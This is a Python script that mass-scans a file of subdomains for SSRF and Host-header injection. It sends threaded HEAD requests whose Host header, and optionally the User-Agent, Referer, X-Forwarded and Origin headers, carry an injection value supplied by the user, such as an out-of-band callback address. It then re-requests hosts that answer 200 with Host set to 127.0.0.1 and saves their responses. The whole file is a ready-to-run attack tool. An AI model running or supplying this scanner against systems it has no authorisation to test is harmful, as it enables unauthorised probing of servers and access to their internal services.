#!/usr/bin/python3

import requests, threading, time, sys

def run():
	moreHeaders = False
	debug = False
	saveOutput = False

	for i in range(1, len(sys.argv)):
		if sys.argv[i] == '-h' or sys.argv[i] == '--help':
			print("""\r\rManual:
				\r-h --help - manual
				\r-d --debug - debug mode
				\r-mh --moreHeaders - if selected User-Agent, Referer, X-Forwarded-Host, X-Forwarded-For
				\rand Origin headers will contain the payload too
				\r-o --output - the file will be saved in the current directory with the specified name""")
			return
		if sys.argv[i] == '-d' or sys.argv[i] == '--debug':
			debug = True
		if sys.argv[i] == '-mh' or sys.argv[i] == '--moreHeaders':
			moreHeaders = True
		if sys.argv[i] == '-o' or sys.argv[i] == '--output':
			saveOutput = True
			outputName = sys.argv[i+1]

	filename = input("Specify the filename:\n")
	injection = input("Specify the injection for the SSRF (it may be your Burp Collab Client):\n")

	file = open(filename,"r")
	subdomsList = file.readlines()
	file.close()

	subdomsList = [subdom.strip() for subdom in subdomsList]

	global status200List, responsesList, status200RespList
	global perc, percShift

	perc = 0
	percShift = round(100 / len(subdomsList), 3)

	status200List = []
	responsesList = []
	status200RespList = []

	print('Starting...')
	for i in range(len(subdomsList)):
		runThread(subdomsList[i], injection, moreHeaders, debug)

	time.sleep(5)

	print(f'100.000%', end='\r')
	print('\nDone!')

	if saveOutput:
		newFile = open(outputName, "w+")
		for i in range(len(responsesList)):
			newFile.write(responsesList[i] + "\n")

		for i in range(len(status200RespList)):
			newFile.write(status200RespList[i])
		newFile.close()


	time.sleep(2)
	print("-"*100)
	print("Status 200 URLs:")
	for i in range(len(status200List)):
		print(status200List[i])

def runThread(target, injection, moreHeaders, debug):
	thread = threading.Thread(target=getHeaders, args=(target,injection, moreHeaders, debug))
	thread.start()

def getHeaders(target, injection, moreHeaders, debug):

	try:
		if moreHeaders:
			r = requests.head(f"http://{target}", 
			headers={"Host":injection, "Cache-Control":"no-transform", "User-Agent":injection,
			"Referer":injection, "X-Forwarded-Host":injection, "X-Forwarded-For": injection,
			"Origin":injection}, 
			timeout=2)
		if not moreHeaders:
			r = requests.head(f"http://{target}", headers={"Host":injection}, timeout=2)


		response = f"http://{target} - {r.status_code}\n{r.headers}\n"
		if debug:
			print(response)
		responsesList.append(response)

		if (r.status_code == 200): 
			status200List.append(f"http://{target}")
			r = requests.get(f'http://{target}', headers={"Host":"127.0.0.1"}, timeout=5)
			response = ("-" * 100) + f"\nhttp://{target} - {r.status_code}\n\n" + r.text
			status200RespList.append(response)

	except Exception as exception:
		response = f"error in http://{target} - {exception.__class__}\n"
		if debug:
			print(f"error in https://{target} - {exception}\n")
		responsesList.append(response)

	try:
		if moreHeaders:
			r = requests.head(f"https://{target}", 
			headers={"Host":injection, "Cache-Control":"no-transform", "User-Agent":injection,
			"Referer":injection, "X-Forwarded-Host":injection, "X-Forwarded-For": injection,
			"Origin":injection}, 
			timeout=2)

		if not moreHeaders:
			r = requests.head(f"https://{target}", headers={"Host":injection}, timeout=2)


		response = f"https://{target} - {r.status_code}\n{r.headers}\n"
		if debug:
			print(response)
		responsesList.append(response)

		if (r.status_code == 200):
			status200List.append(f"https://{target}")
			r = requests.get(f'https://{target}', headers={"Host":"127.0.0.1"}, timeout=5)
			response = ("-" * 100) + f"\nhttps://{target} - {r.status_code}\n\n" + r.text
			status200RespList.append(response)

	except Exception as exception:
		response = f"error in https://{target} - {exception.__class__}\n"
		if debug:
			print(f"error in https://{target} - {exception}\n")
		responsesList.append(response)

	global perc, percShift
	if (round(perc + percShift, 3) < 100):
		perc += percShift
		print(f'{round(perc, 3)}%', end="\r")

run()
